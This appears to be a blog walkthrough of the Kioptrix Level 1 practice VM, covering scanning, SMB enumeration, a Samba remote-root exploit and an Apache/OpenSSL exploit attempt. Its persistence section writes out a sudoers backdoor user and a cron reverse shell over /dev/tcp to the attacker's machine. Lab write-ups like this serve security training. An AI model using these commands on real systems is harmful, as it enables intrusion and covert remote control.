---
layout: post
title: Kioptrix 1 - Walkthrough
---

I have been slow on updating the blog. Not because I haven't been hacking VMs and doing other stuff. I just got lost in other stuff.

## Scanning

So as usual I started out scanning the machine. I have been learning more about metasploit and metasploit database so I tried to use that a bit more. So I scanned with db_nmap


```
Services
========

host           port  proto  name         state  info
----           ----  -----  ----         -----  ----
192.168.1.103  22    tcp    ssh          open   OpenSSH 2.9p2 protocol 1.99
192.168.1.103  80    tcp    http         open   Apache httpd 1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
192.168.1.103  111   tcp    rpcbind      open   2 RPC #100000
192.168.1.103  139   tcp    netbios-ssn  open   Samba smbd workgroup: PMYGROUP
192.168.1.103  443   tcp    ssl/http     open   Apache httpd 1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
192.168.1.103  1024  tcp    status       open   1 RPC #100024
```

## Focus on smb
After checking out the website on 80 and 443, it just had default apache pages, I decided to focus on smb. I have never worked with smb, so I had to read up on what it is, what it does, and what it is for.

So samba, or smb, is a service that provides file-sharing between unix and windows. So you can have a linux-server in the office and have people backup and save all their data on the server, even though they use windows-machines. From a user-perspective you just see a folder that you can enter and add and remove whatever files you want.

So it is not that different from a NFS or FTP-server. And after you have connected to it you can mount the share to you local filesystem. Just like NFS.

So if we search for smb or samba in metasploit we get ton's of good stuff. Some auxiliary modules and a lot of windows exploits. And even some for linux.

```
search smb
```

I tried out a few of the auxiliary modules, but they were not that great. I also tried out a few nmap-scripts, like: enum-shares, and enum-users. But neither returned any new info. So instead I opted to just connect to the server the normal way. On kali you get smbclient included, so after reading the man/help-page I connected like this:

```
smbclient -L 192.168.1.103


Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)
Anonymous login successful
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX

```

If you don't type any password you can make an anonymous login. Here we can see that the version is `Samba 2.2.1a`.

So I did a search with searchsploit, which I have come to really love because you can search with multiple search-terms, unlike `search` which is very buggy. And found some interesting stuff.

```
searchsploit samba linux
Samba <= 2.2.8 - Remote Root Exploit             | ./linux/remote/10.c
```

So I copied and compiled this exploit.
```
./samba -b 0 192.168.1.103
```

And it returned a root-shell. So yeah, not that difficult.

I also tried a few exploits against the apache server, as it was very old an vulnerable. There were several local exploits. But one I really liked was:

```
Apache 1.3.x - 2.0.48 - mod_userdir Remote Users Disclosure Exploit           | ./linux/remote/132.c
```

This was a really nice exploit. You can brutforce usernames really fast with it.


After I had entered I explored the system a bit. Found that root keeps a log in its mail for ssh-login attemps.
The configuration for the samba-server is found in /etc/samba

First I wanted to find out what distro it was, but it didn't show me the usual way:

```
uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

Put in /etc I found

```
sh-2.05# cat redhat-release
cat redhat-release
Red Hat Linux release 7.2 (Enigma)
```

Then I tried to set up a new user for persistence in case someone would patch this 100 years old vulnerability. The `useradd` command was not found, so I had to add them to the path First

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Then I ran
```
useradd pelle
passwd pelle
```

Then I added the user to the sudo goup by doing
```
echo "pelle    ALL=(ALL) ALL" >> /etc/sudoers
```

Once I had a new user with sudo-rights, I also added a cronjob to connect to the attcking machine every minute.

```
crontab -e
*/1 * * * * 0<&196;exec 196<>/dev/tcp/192.168.1.102/5556; sh <&196 >&196 2>&196
```

## Using openssl

So I read in the description of the VM that there are multiple ways to pwn this machine. So I set out to do it again.

This time I started focusing on Apache and OpenSSL.

So by visiting the webpage we understand that it is a RedHat-distro.
So after search with searchsploit I found this exploit

```
Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c)           | ./linux/remote/764.c
```

So I opened it and tried to compile it. And it failed. But in the exploit code I found
```
* http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/
```

So I followed the instructions and updated the script. And ran it. But the script kept dying. It said it managed to spawn a shell.
